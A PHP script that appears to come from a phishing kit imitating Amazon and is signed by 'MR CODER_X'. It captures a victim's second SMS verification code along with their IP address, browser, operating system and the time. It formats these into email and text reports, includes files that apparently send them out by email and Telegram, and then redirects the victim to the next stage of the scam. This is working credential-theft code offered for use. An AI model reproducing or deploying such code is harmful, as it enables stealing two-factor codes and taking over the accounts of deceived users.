<?php

session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$SMS = $_SESSION['SMS'] = $_POST['SMS'];

$msgbank = '

</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">📲 2 SMS CODE 📲 ┃ '.$_SERVER['REMOTE_ADDR'].'┃ BY MR CODER_X 🖕😷🖕 </h2>
<h2>💬 SMS 2      : <span> '.$_SESSION["SMS"].' </span>  </h2>
<hr class="content"><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>
 ';


$yagmai .= '
[💬 SMS２ ] = '.$_SESSION['SMS'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


 $_SESSION['yagmai'] = $yagmai ;


$yagmail .= '
[+]━━━━━━━━【🎁ᗩⲘᗩⲌ〇Ｎ🎁】━━━━━━━━[+]
[+]━━━━━━【📲 2 SMS CODE 📲】━━━━━━[+]
[💬 SMS２] = '.$_SESSION['SMS'].'
[+]━━━━━━━【💻 System】━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━【BY MR CODER_X 🖕😷🖕】━━━━━━[+]';

include("sand_email.php"); 
include("TelegramApi.php"); 






if ($ACSEAMAIL == "ON") {
header('Location: ../Email.php');
} else {
header('Location: ../Wait2.php');
}



?>